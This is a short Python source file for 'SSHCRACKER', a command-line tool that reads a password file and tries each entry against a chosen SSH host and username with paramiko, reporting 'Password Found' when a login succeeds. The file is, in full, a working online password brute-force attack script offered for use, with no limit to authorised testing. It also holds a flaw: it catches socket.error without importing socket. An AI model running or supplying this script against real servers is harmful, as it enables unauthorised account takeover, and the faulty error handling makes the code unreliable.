#!/usr/bin/env python3

import paramiko
import typer

VERSION = 'v0.1'

LOGO = '''
  _____ _____ _    _  _____ _____            _____ _  ________ _____  
 / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
| (___| (___ | |__| | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
  \___ \\___ \|  __  | |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
 ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
|_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ '''

CREDITS = '		  \033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m'

def sshconnect(host, username, password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		# Authentication Failed....
		code = 1
	except socket.error:
		# Connection Failed.... Host Down
		code = 2

	ssh.close()
	return code

'''
1.If sshconnect func return 0 to its caller should check the credentials used to connect to the SSH server be correct.

2.If sshconnect func return 1 to its caller should check the credentials used to connect to the SSH server be wrong.

3.If sshconnect func return 2 to its caller should check the connection fail i.e Host is down, Internet Connectivity or any error with the connection
'''

def main(
	host: str = typer.Option(..., '--host', '-h', help="Specify host address"),
	username: str = typer.Option(..., '--user', '-u', help="Specify username"),
	passfile: typer.FileText = typer.Option(..., '--passfile', '-p', help="Specify password file"),
):
	typer.clear()
	# print logo and cretids
	typer.secho(LOGO + VERSION, fg=typer.colors.BRIGHT_CYAN)
	typer.echo(CREDITS)
	  
	# Output
	for password in passfile:
		password = password.strip()
		try:
			response = sshconnect(host, username, password)
			if response == 0:
				typer.secho(f"[*] User: {username} [*] Password Found {password} [*] Login Correct", fg=typer.colors.BRIGHT_GREEN)
			elif response == 1:
				typer.secho(f"[*] User: {username} [*] Password {password} [*] Login Incorrect", fg=typer.colors.YELLOW)
			elif response == 2:
				typer.secho(f"[*] Connection could not be established to address {host}", fg=typer.colors.RED)
		except Exception as error:
			print (error)
			exit()

if __name__ == "__main__":
	typer.run(main)
